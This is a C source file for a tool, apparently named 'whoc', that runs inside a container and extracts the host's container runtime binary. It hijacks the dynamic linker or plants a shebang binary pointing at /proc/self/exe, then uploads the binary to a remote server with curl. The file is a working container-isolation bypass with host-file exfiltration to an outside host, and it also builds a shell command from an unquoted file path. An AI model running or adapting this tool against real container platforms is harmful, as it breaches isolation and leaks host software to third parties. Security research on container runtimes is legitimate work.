#include "upload_runtime.h"


void print_help(void)
{
    char * help_format = \
"Usage: upload_runtime [options] <server_ip>\n\n"
"Options:\n"
" -p, --port                 Port of remote server, defaults to %d\n"
" -e, --exec                 Wait-for-exec mode for static container runtimes, wait until an exec to the container occurred\n"
" -b, --exec-bin             In exec mode, overrides the default binary created for the exec, default is %s\n"
" -a, --exec-extra-argument  In exec mode, pass an additional argument to the runtime so it won't exit quickly\n"
" -r, --exec-readdir-proc    In exec mode, instead of guessing the runtime pid (which gives whoc one shot of catching the runtime),\n"
"                            find the runtime by searching for new processes under '/proc'.\n";
    printf(help_format, DEFAULT_PORT, DEFAULT_EXEC_BIN);
}


int parse_arguments(config * conf, int argc, char const *argv[])
{
    int opt;
    while ((opt = getopt_long(argc, (char * const*)argv, "b:p:a:er", long_options, NULL)) != -1)
    {
        switch (opt) 
        {
            case 'p':
                conf->port = atoi(optarg);
                break;
            case 'e':
                conf->wait_for_exec = true;
                break;
            case 'a':
                conf->exec_extra_arg = optarg;
                break;
            case 'b':
                conf->exec_bin = optarg;
                break;
            case 'r':
                conf->exec_readdir_mode = true;
                break;
            default: /* '?' */
                print_help();
                return 1;
        }
    }
    if (optind >= argc) 
    {
        print_help();
        return 1;
    }
    conf->server_ip = argv[optind];
    return 0;

}


int sendfile_curl(const char * server_ip, unsigned int port, int fd, const char * filepath)
{
    char curl_cmd[LARGE_BUF_SIZE];
    int rc;

    // File descriptors are preserved through exec, so curl can access file at /proc/self/fd
    if (filepath != NULL)
        rc = snprintf(
            curl_cmd, 
            LARGE_BUF_SIZE, 
            "curl -s -S -H \"Content-Type: application/octet-stream\" -H \"Content-Disposition: attachment; filename=%s\" --data-binary @/proc/self/fd/%d %s:%u", 
            filepath,
            fd,
            server_ip,
            port);
    else
        rc = snprintf(
            curl_cmd, 
            LARGE_BUF_SIZE, 
            "curl -s -S -H \"Content-Type: application/octet-stream\" -H \"Content-Disposition: attachment\" --data-binary @/proc/self/fd/%d %s:%u", 
            fd,
            server_ip,
            port);
    
    if (rc < 0) 
    {
        printf("[!] sendfile_curl: snprintf(curl_cmd) failed with '%s'\n", strerror(errno));
        return -1;
    }
    if (rc >= LARGE_BUF_SIZE)
    {
        printf("[!] sendfile_curl: snprintf(curl_cmd) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, SMALL_BUF_SIZE);
        return -1;
    }

    errno = 0; 
    rc = system(curl_cmd);

    if (rc == 0 && errno == 0)
        return 0;
    
    if (errno != 0)
        printf("[!] sendfile_curl: Failed to spawn curl via system() with '%s'\n", strerror(errno));
    else
        printf("[!] sendfile_curl: \"/bin/sh -c 'curl ...'\" returned non-zero exit code '%d'\n", rc);

    return -1;
}


int main(int argc, char const *argv[])
{
    int sockfd, runtime_fd = -1;
    struct stat file_info;
    char rt_hostpath_buf[SMALL_BUF_SIZE], ctr_link_to_rt_buf[SMALL_BUF_SIZE];  
    char * rt_hostpath, * ld_path;
    int rc;

    /* Default configuration */
    config conf = {
        .server_ip = NULL, 
        .port = DEFAULT_PORT, 
        .wait_for_exec = false,
        .exec_extra_arg = NULL,
        .exec_bin = DEFAULT_EXEC_BIN,
        .exec_readdir_mode = false
    };
    if (parse_arguments(&conf, argc, argv) != 0)
        return 1;

    /* Get a file descriptor for the host's container runtime */
    if (!conf.wait_for_exec)
    {
        /* Running as the dynamic linker of the runtime process, so the runtime should be accessible at /proc/self/exe */
        runtime_fd = open("/proc/self/exe", O_RDONLY); 
        if (runtime_fd < 0)
        {
            printf("[!] main: open(\"/proc/self/exe\") failed with '%s'\n", strerror(errno));
            return 1;
        }

        // Restore original dynamic linker to allow curl to work properly
        ld_path = getenv(LD_PATH_ENVAR);
        if (!ld_path)
        {
            printf("[!] main: Failed to get the '%s' environment variable\n", LD_PATH_ENVAR);
            goto close_runtime_ret_1;
        }
        if (rename(ORIGINAL_LD_PATH, ld_path) < 0)
        {
            printf("[!] main: Failed to restore dynamic linker via rename() with '%s'\n", strerror(errno));
            goto close_runtime_ret_1;
        }
    }
    else
    {   
        /* Running as a normal process in the container, waiting for the runtime to exec in */
        printf("[+] Running in wait-for-exec mode; preparing '%s'\n", conf.exec_bin);

        // Create an executable at conf.exec_bin containing a shebang that points to the container runtime (#!/proc/self/exe)
        if (prepare_bin_for_exec(conf.exec_bin, conf.exec_extra_arg) == false)
            return 1;  // error printed in prepare_bin_for_exec()

        // Open fd to runtime
        if (!conf.exec_readdir_mode)
            runtime_fd = catch_rt_guess_pid(conf.exec_bin);
        else
            runtime_fd = catch_rt_getdents_proc(conf.exec_bin);
        if (runtime_fd < 0)
            return 1;
    }

    /* Prepare container link to runtime /proc/self/fd/<runtime_fd> */
    rc = snprintf(ctr_link_to_rt_buf, SMALL_BUF_SIZE, "/proc/self/fd/%d", runtime_fd);
    if (rc < 0) 
    {
        printf("[!] main: snprintf(ctr_link_to_rt_buf) failed with '%s'\n", strerror(errno));
        goto close_runtime_ret_1;
    }
    if (rc >= SMALL_BUF_SIZE)
    {
        printf("[!] main: snprintf(ctr_link_to_rt_buf) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, SMALL_BUF_SIZE);
        goto close_runtime_ret_1;
    }

    /* Get container runtime size */
    if(fstat(runtime_fd, &file_info) != 0)
    {
        printf("[!] upload_file: fstat(fp) failed with '%s'\n", strerror(errno));
        goto close_runtime_ret_1;
    }

    /* Try to get the runtime's path on the host */
    rc = readlink(ctr_link_to_rt_buf, rt_hostpath_buf, SMALL_BUF_SIZE);
    if (rc < 0)
    {
        printf("[!] main: readlink(ctr_link_to_rt_buf) failed with '%s', continuing without the runtime's path\n", strerror(errno));
        rt_hostpath = NULL;
    }
    else
    {
        rt_hostpath_buf[rc] = 0;
        rt_hostpath = rt_hostpath_buf;
    }

    /* Upload runtime to server */
    printf("[+] Uploading...\n");
    // No hurry to send the runtime since we have a file descriptor pointing to it.
    // Defer to curl
    if (sendfile_curl(conf.server_ip, conf.port, runtime_fd, rt_hostpath) < 0)
        goto close_runtime_ret_1;

    printf("[+] Done\n");
    return 0;

close_runtime_ret_1:
    close(runtime_fd); 
    return 1;
}
